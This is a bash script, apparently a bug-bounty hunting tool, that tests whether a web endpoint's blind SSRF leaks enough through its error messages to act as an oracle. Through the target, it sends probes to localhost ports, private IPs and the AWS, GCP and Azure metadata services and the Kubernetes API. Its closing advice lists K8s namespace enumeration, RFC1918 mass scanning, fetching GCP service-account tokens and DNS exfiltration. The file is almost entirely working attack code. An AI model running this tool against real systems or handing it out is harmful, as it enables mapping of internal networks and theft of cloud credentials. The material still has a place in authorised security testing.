#!/usr/bin/env bash
# hunt-ssrf-oracle-probe.sh — Detect blind SSRF that can be turned into a 3-tier classification oracle
# 來源：Pattern - Blind SSRF Oracle Technique（KB）
#      digiwin Submission #76/#121/#122-124（K8s topology mapping via error diff）
#
# 偵測「該 endpoint 是否能用 error message 差異把 blind SSRF 變 oracle」。
# 用 5 個 baseline URL probe，比對回應 (status + body hash + body keyword diff)：
#   HTTP✓        : httpbin.org/anything           （存活 + HTTP 應答）
#   REFUSED      : 127.0.0.1:1                    （port closed）
#   AUTH/TCP     : 127.0.0.1:22                   （SSH, TCP up, not HTTP）
#   DNS_FAIL     : nx-bbflow-$(rand).invalid      （DNS 不解）
#   TIMEOUT      : 10.255.255.1                   （RFC1918 unreachable）
#
# 用法：
#   ./hunt-ssrf-oracle-probe.sh https://app.example.com/purchase/v1/check-enquiry-file
#     # 預設用 {"file_url":"$URL"} body + Content-Type:application/json
#
#   BODY_TEMPLATE='{"image_url":"$URL"}' ./hunt-ssrf-oracle-probe.sh https://...
#     # 自訂 body shape
#
#   HEADERS='-H "x-api-key: $KEY"' ./hunt-ssrf-oracle-probe.sh https://...
#     # 自訂 auth header（注意 quote）
#
# Output: ssrf_oracle_out/<slug>.txt — 5 個 baseline 回應對照表 + oracle 等級結論
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

URL="${1:-}"
[ -z "$URL" ] && { cat <<USAGE
Usage: $0 <full-url>

Optional env vars:
  BODY_TEMPLATE   JSON body 範本，\$URL 是 placeholder（default: {"file_url":"\$URL"}）
  METHOD          HTTP method（default: POST）
  HEADERS         額外 curl headers（e.g. '-H "x-api-key: KEY"'）
  OUT_DIR         輸出目錄（default: ./ssrf_oracle_out）
  AUTO_FALLBACK   1=試多種 body shape 直到拿到非空回應（default: 0）

Body shape 預設：{"file_url":"\$URL"}
Auto-fallback 會試：file_url / url / image_url / fetch_url / target_url / proxy / src
USAGE
  exit 1
}

OUT_DIR="${OUT_DIR:-./ssrf_oracle_out}"
METHOD="${METHOD:-POST}"
BODY_TEMPLATE="${BODY_TEMPLATE:-{\"file_url\":\"\$URL\"}}"
HEADERS="${HEADERS:-}"
AUTO_FALLBACK="${AUTO_FALLBACK:-0}"
mkdir -p "$OUT_DIR"

SLUG=$(echo "$URL" | sed 's|https\?://||;s|[/:?&=]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit() { echo "🔴 $*" | tee -a "$OUT"; }
warn() { echo "🟠 $*" | tee -a "$OUT"; }
info() { echo "   $*" >> "$OUT"; }

RAND=$(head -c 6 /dev/urandom 2>/dev/null | xxd -p 2>/dev/null || date +%s%N | tail -c 8)

# 5 baseline URL
declare -a BASELINE_LABELS=(
  "HTTP_OK"
  "REFUSED"
  "AUTH_TCP"
  "DNS_FAIL"
  "TIMEOUT"
)
declare -a BASELINE_URLS=(
  "http://httpbin.org/anything"
  "http://127.0.0.1:1/"
  "http://127.0.0.1:22/"
  "http://nx-bbflow-${RAND}.invalid/"
  "http://10.255.255.1/"
)

# Cluster fingerprint URLs (額外探測 — 若 HTTP_OK 有 oracle，這些也試)
declare -a META_LABELS=(
  "AWS_METADATA"
  "GCP_METADATA"
  "AZURE_METADATA"
  "K8S_CLUSTER"
)
declare -a META_URLS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://169.254.169.254/metadata/instance"
  "http://kubernetes.default.svc.cluster.local/"
)

probe() {
  local target_url="$1" label="$2"
  local body
  body=$(echo "$BODY_TEMPLATE" | sed "s|\$URL|${target_url}|g")

  local cmd="curl -sk --max-time 30 -X $METHOD -H 'Content-Type: application/json' $HEADERS -d '$body' '$URL'"

  local start=$(date +%s%N 2>/dev/null || date +%s)
  local resp
  resp=$(curl -sk --max-time 30 -X "$METHOD" \
    -H "Content-Type: application/json" \
    $HEADERS \
    -d "$body" \
    -w "\n[HTTP_STATUS:%{http_code}]\n" \
    "$URL" 2>&1)
  local end=$(date +%s%N 2>/dev/null || date +%s)

  local status
  status=$(echo "$resp" | grep -oE 'HTTP_STATUS:[0-9]+' | head -1 | cut -d: -f2)

  # 拿掉 status marker 並 truncate body 到 200 chars
  local body_short
  body_short=$(echo "$resp" | sed 's/\[HTTP_STATUS:[0-9]*\]//' | tr -d '\n\r' | head -c 200)

  echo "─── $label: $target_url" >> "$OUT"
  echo "    body template: $body" >> "$OUT"
  echo "    HTTP: $status" >> "$OUT"
  echo "    body[0..200]: $body_short" >> "$OUT"
  echo "" >> "$OUT"

  # 回傳 status:body_hash (用於去重判斷)
  local body_hash
  body_hash=$(echo "$body_short" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "$body_short" | shasum 2>/dev/null | cut -d' ' -f1 || echo "nohash")
  echo "${status}:${body_hash:0:8}:${body_short:0:80}"
}

log "═══ SSRF Oracle Probe: $URL ═══"
log "    Method: $METHOD"
log "    Body template: $BODY_TEMPLATE"
log "    Headers: ${HEADERS:-(none)}"
log ""

# Run 5 baselines
declare -a RESPONSES
log "── 5-tier baseline ──"
for i in "${!BASELINE_LABELS[@]}"; do
  RESP=$(probe "${BASELINE_URLS[$i]}" "${BASELINE_LABELS[$i]}")
  RESPONSES+=("$RESP")
  log "  ${BASELINE_LABELS[$i]}: $RESP"
done
log ""

# Diff analysis — 看多少個 unique response
log "── Oracle Analysis ──"
UNIQUE_COUNT=$(printf "%s\n" "${RESPONSES[@]}" | awk -F: '{print $1":"$2}' | sort -u | wc -l | tr -d ' ')
log "  Unique response signatures: $UNIQUE_COUNT / 5"

# 分級
ORACLE_GRADE="UNKNOWN"
if [ "$UNIQUE_COUNT" -ge 4 ]; then
  hit "FULL ORACLE: $UNIQUE_COUNT/5 unique → 可區分 HTTP/TCP/DNS/REFUSED/TIMEOUT layer"
  hit "  → Severity 候選：P3 Medium ~ P1 Critical（看內部 service 是否 unauth）"
  ORACLE_GRADE="FULL"
elif [ "$UNIQUE_COUNT" -ge 3 ]; then
  warn "PARTIAL ORACLE: $UNIQUE_COUNT/5 unique → 部分 layer 可區分"
  warn "  → Severity 候選：P4 Low"
  ORACLE_GRADE="PARTIAL"
elif [ "$UNIQUE_COUNT" -ge 2 ]; then
  echo "🟡 WEAK ORACLE: 2/5 unique → 僅能粗略分類，價值有限" | tee -a "$OUT"
  ORACLE_GRADE="WEAK"
else
  echo "✓ NO ORACLE: 所有 baseline 回應相同 → 只能用 OOB（callback）" >> "$OUT"
  ORACLE_GRADE="NONE"
fi
log ""

# 若 oracle ≥ PARTIAL，再跑 cluster metadata 探測
if [ "$ORACLE_GRADE" = "FULL" ] || [ "$ORACLE_GRADE" = "PARTIAL" ]; then
  log "── Cloud Metadata / K8s Fingerprint ──"
  for i in "${!META_LABELS[@]}"; do
    RESP=$(probe "${META_URLS[$i]}" "${META_LABELS[$i]}")
    info "  ${META_LABELS[$i]}: $RESP"

    # 比對 metadata 回應 vs REFUSED baseline，若不同 = 可達
    REFUSED_HASH=$(echo "${RESPONSES[1]}" | awk -F: '{print $1":"$2}')
    META_HASH=$(echo "$RESP" | awk -F: '{print $1":"$2}')
    if [ "$META_HASH" != "$REFUSED_HASH" ]; then
      hit "    ${META_LABELS[$i]} 可達！ 與 REFUSED baseline 回應不同 → cluster fingerprint confirmed"
    fi
  done
fi

log ""
log "═══ Summary ═══"
log "  Oracle Grade: $ORACLE_GRADE"
log "  Output: $OUT"
log ""
log "下一步建議："
case "$ORACLE_GRADE" in
  FULL)
    log "  1. enum K8s namespace: <svc>.{default,prod,sit,staging}.svc.cluster.local"
    log "  2. 從 target 自身 /services 或 /registry endpoint 取得內部 service name 再 oracle"
    log "  3. 試 RFC1918 mass scan: for i in {1..254}; do oracle 10.x.x.\$i; done"
    log "  4. cloud metadata：若 GCP fingerprint 命中，試 service-account token endpoint"
    ;;
  PARTIAL|WEAK)
    log "  1. 確認其他 SSRF gadget 是否在同 target 存在（更佳 oracle 來源）"
    log "  2. 試其他 body shape：image_url / fetch_url / url / src（用 AUTO_FALLBACK=1）"
    ;;
  NONE)
    log "  1. 改用 OOB callback：Burp Collaborator / interactsh.com"
    log "  2. DNS exfiltration（若拿到 metadata）"
    ;;
esac
